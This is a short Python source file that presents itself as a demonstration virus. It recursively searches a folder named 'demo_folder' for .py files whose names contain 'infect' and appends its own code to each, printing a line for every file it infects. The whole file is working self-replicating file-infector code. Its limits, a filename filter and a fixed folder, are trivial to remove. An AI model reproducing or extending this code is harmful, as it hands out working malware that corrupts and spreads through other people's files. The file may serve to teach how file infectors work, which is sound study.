import os

SIGNATURE = "This is a demonstration of a virus."


# Only infects python files with "infect" in the filename
def search(path):
    files_to_infect_lst = []
    file_list = os.listdir(path)
    for filename in file_list:
        full_path = os.path.join(path, filename)
        if os.path.isdir(full_path):
            files_to_infect_lst.extend(search(full_path))
        elif "infect" in filename and filename[-3:] == ".py":
            files_to_infect_lst.append(full_path)
    return files_to_infect_lst


# Copy file contents and attach worm to end of file
def infect(files_to_infect):
    virus = open(os.path.abspath(__file__))
    virus_string = ""
    for i, line in enumerate(virus):
        virus_string += line
    virus.close()
    for filename in files_to_infect:
        f = open(filename)
        temp = f.read()
        f.close()
        f = open(filename, "w")
        f.write(temp + "\n" + virus_string)
        print(f"{filename} infected.")
        f.close()


if __name__ == "__main__":
    directory = "demo_folder"
    files_to_infect = search(directory)
    infect(files_to_infect)
